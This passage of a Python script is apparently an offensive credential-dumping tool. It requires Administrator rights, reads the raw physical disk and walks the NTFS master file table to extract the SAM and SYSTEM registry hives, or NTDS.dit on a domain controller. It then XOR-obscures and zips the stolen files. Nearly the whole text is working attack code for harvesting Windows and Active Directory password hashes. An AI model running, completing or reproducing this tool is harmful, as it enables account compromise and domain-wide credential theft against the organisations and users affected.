            mft_sub_chunk_data = read_from_offset(drive_handle, current_mft_chunk_disk_offset, bytes_to_read_sub_chunk)
            if not mft_sub_chunk_data:
                if VERBOSE_DEBUG: print(f"\n[-] Error reading MFT sub-chunk at 0x{current_mft_chunk_disk_offset:X}.")
                return None # Critical error reading MFT

            # Iterate MFT records within this sub-chunk
            offset_within_sub_chunk = 0
            while offset_within_sub_chunk + STANDARD_MFT_RECORD_STRUCT_SIZE <= len(mft_sub_chunk_data):
                # Slice one potential MFT record (using standard size for initial parsing)
                record_data_slice = mft_sub_chunk_data[offset_within_sub_chunk : offset_within_sub_chunk + STANDARD_MFT_RECORD_STRUCT_SIZE]
                # Absolute disk offset of this specific MFT record
                this_record_absolute_disk_offset = current_mft_chunk_disk_offset + offset_within_sub_chunk

                file_info = parse_mft_record_for_file_info(record_data_slice, this_record_absolute_disk_offset, vbr_info, target_filename_simple)
                if file_info:
                    print(f"\n[+] Found target '{target_filename_simple}'! MFT Record: {file_info.record_number}")
                    return file_info
                
                # Advance by the allocated size of an MFT record (could be > STANDARD_MFT_RECORD_STRUCT_SIZE)
                offset_within_sub_chunk += vbr_info.allocated_bytes_per_mft_record
            
            current_offset_in_run += len(mft_sub_chunk_data) # Advance by actual bytes read for this sub_chunk
    
    print(f"\n[-] File '{target_filename_simple}' not found after scanning $MFT runs.")
    return None

# --- XOR and ZIP Functions ---
def xor_data_bytes(data_bytes, key_bytes):
    if not key_bytes: return data_bytes
    key_len = len(key_bytes)
    return bytes(data_bytes[i] ^ key_bytes[i % key_len] for i in range(len(data_bytes)))

def create_zip_file(file_data_map_bytes, output_zip_filename):
    """Creates a ZIP file without password protection."""
    try:
        with zipfile.ZipFile(output_zip_filename, "w", zipfile.ZIP_DEFLATED) as zf:
            for filename_in_zip, data_bytes_content in file_data_map_bytes.items():
                zf.writestr(filename_in_zip, data_bytes_content)
        print(f"[+] Files written to ZIP: {output_zip_filename}")
        return True
    except Exception as e:
        print(f"[-] Error creating ZIP file: {e}")
        return False

# --- Main Execution ---
def main():
    if not is_admin():
        print("[-] This script requires Administrator privileges to run.")
        sys.exit(1)
    print("[+] Running with Administrator privileges.")

    drive_handle = None
    target_files_content = {} # Stores {display_name: content_bytes}
    
    is_dc = is_domain_controller()
    if is_dc:
        print("[+] Domain Controller detected. Targeting NTDS.dit and SYSTEM.")
        primary_hive_target_name = TARGET_NTDS_FILENAME # Filename for MFT search
        primary_hive_display_name = "NTDS.dit"         # Filename for ZIP and messages
    else:
        print("[+] Workstation or Member Server detected. Targeting SAM and SYSTEM.")
        primary_hive_target_name = TARGET_SAM_FILENAME_DEFAULT
        primary_hive_display_name = "SAM"

    try:
        drive_handle = open_physical_drive(0) # Default to PhysicalDrive0
        if not drive_handle: sys.exit(1)

        vbr_info_stub = get_ntfs_partition_info(drive_handle)
        if not vbr_info_stub:
            print("[-] Could not identify a suitable NTFS partition.")
            sys.exit(1)

        vbr_info = parse_full_vbr_info(drive_handle, vbr_info_stub)
        if not vbr_info:
            print("[-] Failed to parse full VBR information for the selected partition.")
            sys.exit(1)
        if VERBOSE_DEBUG: print(f"[+] Successfully parsed VBR: {vbr_info!r}")

        print("[*] Attempting to parse $MFT (Record 0)...")
        bytes_per_cluster = vbr_info.bytes_per_sector * vbr_info.sectors_per_cluster
        # Calculate physical offset of $MFT (record 0)
        mft_record0_disk_offset = vbr_info.partition_start_offset_bytes + (vbr_info.mft_start_lcn * bytes_per_cluster)
        
        mft_record0_data = read_from_offset(drive_handle, mft_record0_disk_offset, vbr_info.allocated_bytes_per_mft_record)
        if not mft_record0_data:
            print("[-] Failed to read $MFT (Record 0).")
            sys.exit(1)

        mft_meta_file_info = parse_mft_record_for_file_info(mft_record0_data, mft_record0_disk_offset, vbr_info, "$MFT")
        if not mft_meta_file_info or not mft_meta_file_info.data_attribute_found:
            print("[-] Failed to parse $MFT's $DATA attribute from its own record.")
            sys.exit(1)
        
        if VERBOSE_DEBUG: print(f"[+] $MFT metadata parsed: {mft_meta_file_info!r}")
        if mft_meta_file_info.data_is_resident:
            print("[-] $MFT's $DATA attribute is resident. This is unusual. Cannot proceed.")
            sys.exit(1)
        
        mft_data_runs = mft_meta_file_info.non_resident_data_runs
        mft_actual_size = mft_meta_file_info.non_resident_real_size

        if not mft_data_runs and mft_actual_size > 0:
            print("[!] $MFT has non-zero size but no data runs parsed from its record. Scan might fail.")
            # Consider fallback to linear scan if this is critical, for now, exit.
            sys.exit(1)
        elif not mft_data_runs and mft_actual_size == 0: # $MFT is empty or runs not found
             print("[i] $MFT appears empty or its runs could not be determined. Cannot scan.")
             sys.exit(1)
        
        print(f"[+] Successfully parsed $MFT data runs. Real Size: {mft_actual_size} bytes. Number of runs: {len(mft_data_runs)}")

        # --- Target Primary Hive (SAM or NTDS.dit) ---
        print(f"\n[*] Searching for '{primary_hive_target_name}' (to be stored as {primary_hive_display_name})...")
        primary_hive_mft_info = find_target_file_in_mft(drive_handle, vbr_info, mft_data_runs, mft_actual_size, primary_hive_target_name)
        if primary_hive_mft_info:
            if VERBOSE_DEBUG: print(f"[+] MFT Entry for {primary_hive_display_name} found: {primary_hive_mft_info!r}")
            primary_hive_content = read_file_content_from_disk(drive_handle, primary_hive_mft_info, vbr_info)
            if primary_hive_content:
                print(f"[+] Successfully read {primary_hive_display_name} content ({len(primary_hive_content)} bytes).")
                # Signature check for SAM (regf). NTDS.dit has an ESE database signature, not 'regf'.
                if primary_hive_target_name == TARGET_SAM_FILENAME_DEFAULT:
                    if len(primary_hive_content) >= SAM_SIGNATURE_CHECK_SIZE and primary_hive_content[:SAM_SIGNATURE_CHECK_SIZE] == b'regf':
                        print(f"[+] {primary_hive_display_name} file signature 'regf' VERIFIED.")
                    else:
                        print(f"[!] {primary_hive_display_name} file signature 'regf' NOT found or file corrupted.")
                elif primary_hive_target_name == TARGET_NTDS_FILENAME:
                     # For NTDS.dit, the first few bytes are part of the ESE database header.
                     # Example: b'\xef\xcd\xab\x89' for a valid ESE db.
                     if len(primary_hive_content) >= 4 and primary_hive_content[:4] == b'\xef\xcd\xab\x89':
                         print(f"[i] NTDS.dit ESE database signature VERIFIED.")
                     else:
                         print(f"[!] NTDS.dit does not have expected ESE signature. May be corrupted or incorrect file.")
                target_files_content[primary_hive_display_name] = primary_hive_content
            else: print(f"[-] Failed to read content for {primary_hive_display_name}.")
        else: print(f"[-] {primary_hive_display_name} not found in MFT.")

        # --- Target SYSTEM Hive (always needed) ---
        print(f"\n[*] Searching for '{TARGET_SYSTEM_FILENAME}'...")
        system_file_mft_info = find_target_file_in_mft(drive_handle, vbr_info, mft_data_runs, mft_actual_size, TARGET_SYSTEM_FILENAME)
        if system_file_mft_info:
            if VERBOSE_DEBUG: print(f"[+] MFT Entry for SYSTEM found: {system_file_mft_info!r}")
            system_content = read_file_content_from_disk(drive_handle, system_file_mft_info, vbr_info)
            if system_content:
                print(f"[+] Successfully read SYSTEM hive content ({len(system_content)} bytes).")
                if len(system_content) >= SAM_SIGNATURE_CHECK_SIZE and system_content[:SAM_SIGNATURE_CHECK_SIZE] == b'regf':
                    print("[+] SYSTEM file signature 'regf' VERIFIED.")
                else:
                    print("[!] SYSTEM file signature 'regf' NOT found or corrupted.")
                target_files_content[TARGET_SYSTEM_FILENAME] = system_content # Store SYSTEM hive content
            else: print(f"[-] Failed to read content for {TARGET_SYSTEM_FILENAME}.")
        else: print(f"[-] {TARGET_SYSTEM_FILENAME} not found in MFT.")

        # --- Package Files ---
        if not target_files_content:
            print("\n[-] No target files were successfully read. Exiting.")
            sys.exit(1)
        
        # Ensure SYSTEM hive was found, as it's critical
        if TARGET_SYSTEM_FILENAME not in target_files_content:
            print(f"\n[-] CRITICAL: {TARGET_SYSTEM_FILENAME} hive not found or read. Cannot proceed with secrets dumping effectively.")
            sys.exit(1)
        if primary_hive_display_name not in target_files_content:
             print(f"\n[-] CRITICAL: {primary_hive_display_name} not found or read. Cannot proceed with secrets dumping effectively.")
             sys.exit(1)


        print(f"\n[*] Preparing ZIP file '{OUTPUT_ZIP_FILENAME}'...")
        files_to_zip_data = {}
        for filename_key, content_bytes in target_files_content.items(): # filename_key is "SAM", "NTDS.dit", or "SYSTEM"
            if content_bytes:
                print(f"[+] XORing {filename_key} with key '{XOR_KEY.decode(errors="ignore")}'...")
                xored_content = xor_data_bytes(content_bytes, XOR_KEY)
                files_to_zip_data[f"{filename_key.lower()}.xored"] = xored_content 
        
        if files_to_zip_data:
            create_zip_file(files_to_zip_data, OUTPUT_ZIP_FILENAME)
        else:
            print("[-] No content to zip.")

    except PermissionError:
        print("[-] Permission denied. Please ensure the script is run as Administrator.")
    except Exception as e:
        print(f"[!!!] An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if drive_handle:
            close_physical_drive(drive_handle)
    
    print("\n[*] Script finished.")

if __name__ == "__main__":
    main()
